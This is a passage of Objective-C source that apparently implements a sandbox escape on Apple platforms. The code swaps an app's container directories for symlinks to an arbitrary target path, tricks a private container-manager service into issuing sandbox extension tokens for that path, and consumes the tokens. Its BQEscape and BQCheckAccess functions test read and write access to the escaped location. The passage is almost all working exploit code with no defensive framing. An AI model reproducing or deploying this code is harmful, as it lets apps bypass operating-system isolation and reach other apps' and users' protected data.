    else if (g.set_ids) g.set_ids(q, x);
    if (g.set_part) g.set_part(q, part);
    if (g.set_flags) g.set_flags(q, flags);
    if (x && p_xpc_release) p_xpc_release(x);
    void *res = g.get_one(q);
    char *copy = NULL;
    if (res && g.get_path) {
        const char *p = g.get_path(res);
        if (p) copy = strdup(p);
    }
    g.query_free(q);
    return copy;
}

NSString *BQLookupApplicationDataPath(NSString *bundleID) {
    if (![bundleID isKindOfClass:NSString.class] || !bundleID.length || bundleID.length > 255) return nil;
    NSCharacterSet *allowed = [NSCharacterSet characterSetWithCharactersInString:@"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.-_"];
    if ([bundleID rangeOfCharacterFromSet:allowed.invertedSet].location != NSNotFound) return nil;
    for (NSString *component in [bundleID componentsSeparatedByString:@"."]) if (!component.length) return nil;
    if (!BQCoreInit() || !g.set_ids) return nil;
    fn_get_path getIdentifier = (fn_get_path)dlsym(g.h, "container_object_get_identifier");
    if (!getIdentifier) return nil;
    void *query = g.create();
    if (!query) return nil;
    @try {
        bq_xpc_object_t identifier = p_xpc_string_create(bundleID.UTF8String);
        if (!identifier) return nil;  
        g.set_class(query, 2); g.set_ids(query, identifier);
        p_xpc_release(identifier);



        g.set_part(query, 0); g.set_flags(query, 0x100000000ULL);
        void *result = g.get_one(query);
        const char *observedID = result ? getIdentifier(result) : NULL;
        if (!observedID || ![[NSString stringWithUTF8String:observedID] isEqual:bundleID]) return nil;
        const char *raw = g.get_path(result);
        return raw ? [NSString stringWithUTF8String:raw] : nil;
    } @finally { g.query_free(query); }
}

NSDictionary *BQProbeClass2Parts(NSString *target) {
    if (!BQCoreInit()) return @{@"error": bq_escape_error(-7)};
    NSMutableDictionary *r = [NSMutableDictionary dictionary];
    NSString *bundle = [[NSBundle mainBundle] bundleIdentifier];
    NSMutableDictionary *paths = [NSMutableDictionary dictionary];
    for (uint64_t p = 0; p <= 6; p++) {
        char *cp = bq_query_part_path(2, bundle, p, 0x100000000ULL);
        NSString *path = cp ? [NSString stringWithUTF8String:cp] : nil;
        if (cp) free(cp);
        BQLog(@"c2 part %llu -> %@", p, path ?: @"(null)");
        if (path.length) {
            paths[@(p).stringValue] = path;
            r[@(p).stringValue] = path;
        }
    }
    for (uint64_t p = 2; p <= 6; p++) {
        NSString *path = paths[@(p).stringValue];
        if (!path.length) continue;
        struct stat st;
        if (lstat(path.fileSystemRepresentation, &st) != 0 || !S_ISDIR(st.st_mode)) {
            BQLog(@"c2 move p%llu: not a dir", p);
            continue;
        }
        NSString *bak = [path stringByAppendingString:@".bqpartprobe"];
        unlink(bak.fileSystemRepresentation);
        errno = 0;
        int mv = rename(path.fileSystemRepresentation, bak.fileSystemRepresentation);
        BQLog(@"c2 move p%llu %@ -> %d errno=%d", p, path, mv, errno);
        if (mv != 0) continue;
        unlink(path.fileSystemRepresentation);
        errno = 0;
        int sl = symlink(target.fileSystemRepresentation, path.fileSystemRepresentation);
        BQLog(@"c2 symlink p%llu -> %d errno=%d", p, sl, errno);
        if (sl == 0) {
            void *q = g.create();
            if (q) {
                g.set_class(q, 2);
                bq_xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(bundle.UTF8String) : NULL;
                if (g.set_ids) g.set_ids(q, x);
                if (g.set_part) g.set_part(q, p);
                if (g.set_flags) g.set_flags(q, 0x8100000000ULL);
                if (x && p_xpc_release) p_xpc_release(x);
                void *res = g.get_one(q);
                char *tok = res && g.copy_token ? g.copy_token(res) : NULL;
                int64_t h = (tok && g.consume) ? g.consume(tok) : -1;
                BQLog(@"c2 p%llu result=%p token=%s consume=%lld", p, res, tok ? "YES" : "NO", (long long)h);
                if (tok) free(tok);
                if (h >= 0) {
                    NSString *marker = [path stringByAppendingPathComponent:
                        [NSString stringWithFormat:@".bqpartprobe_%d", getpid()]];
                    int fd = open(marker.fileSystemRepresentation, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
                    if (fd >= 0) {
                        write(fd, "ok", 2);
                        close(fd);
                        unlink(marker.fileSystemRepresentation);
                        BQLog(@"c2 p%llu marker OK", p);
                    } else {
                        BQLog(@"c2 p%llu marker fail errno=%d", p, errno);
                    }
                    g.release(h);
                }
                g.query_free(q);
            }
            unlink(path.fileSystemRepresentation);
        }
        rename(bak.fileSystemRepresentation, path.fileSystemRepresentation);
    }
    return r;
}

BOOL BQCheckAccess(NSString *target, BOOL writable, NSString **err) {
    NSString *link = nil;
    int64_t h = BQEscape(target, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return NO;
    }
    BOOL ok = NO;
    if (writable) {
        NSString *leaf = [NSString stringWithFormat:@".bqtool_probe_%d", getpid()];
        NSString *p = [link stringByAppendingPathComponent:leaf];
        int fd = open(p.fileSystemRepresentation, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
        if (fd >= 0) {
            ok = (write(fd, "ok", 2) == 2);
            close(fd);
            unlink(p.fileSystemRepresentation);
        } else {
            if (err) *err = [NSString stringWithFormat:@"open %@ failed: %s", target, strerror(errno)];
        }
    } else {
        DIR *d = opendir(link.fileSystemRepresentation);
        if (d) { ok = YES; closedir(d); }
        else if (err) *err = [NSString stringWithFormat:@"opendir %@ failed: %s", target, strerror(errno)];
    }
    BQEndEscape(h);
    return ok;
}
